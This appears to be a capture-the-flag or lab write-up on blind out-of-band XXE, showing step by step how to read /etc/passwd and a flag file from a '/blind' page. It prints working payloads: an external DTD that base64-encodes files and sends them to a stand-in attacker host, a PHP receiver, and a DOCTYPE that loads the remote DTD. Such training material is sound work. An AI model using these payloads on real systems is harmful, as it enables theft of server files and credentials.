# Blind Data Exfiltration

### Using Blind Data Exfiltration on the '/blind' page to read the content of '/327a6c4304ad5938eaf0efb6cc3e53dc.php' and get the flag.



**Step 1** - Setup the attack machine:

* Create a file called **xxe.dtd** to be used:
  * {% code overflow="wrap" %}
    ```xml
    <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
    <!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
    ```
    {% endcode %}
* Create a PHP file to automatically decode the base64 string:
  * ```php
    <?php
    if(isset($_GET['content'])){
        error_log("\n\n" . base64_decode($_GET['content']));
    }
    ?>
    ```
* Start a PHP server:
  * ```bash
    php -S 0.0.0.0:8000
    ```

**Step 2** - Setup the attack machine:

* Add the payload to the POST Request
  *   ```xml
      <!DOCTYPE email [ 
        <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
        %remote;
        %oob;
      ]>
      ```


  *

      <figure><img src="../../../.gitbook/assets/image (250).png" alt=""><figcaption></figcaption></figure>
* Test the Payload
  *

      <figure><img src="../../../.gitbook/assets/image (251).png" alt=""><figcaption></figcaption></figure>

As we can see our payload got sucessfully executed, and we manage to get the `/etc/passwd` content.

**Step 3** - Change the content of the **xxe.dtd** file:

* Get the 327a6c4304ad5938eaf0efb6cc3e53dc.php content
  *   {% code overflow="wrap" %}
      ```xml
      <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/327a6c4304ad5938eaf0efb6cc3e53dc.php">
      <!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
      ```
      {% endcode %}


* Send the POST Request on Burp Suite
  *

      <figure><img src="../../../.gitbook/assets/image (252).png" alt=""><figcaption></figcaption></figure>

And we got the flag!







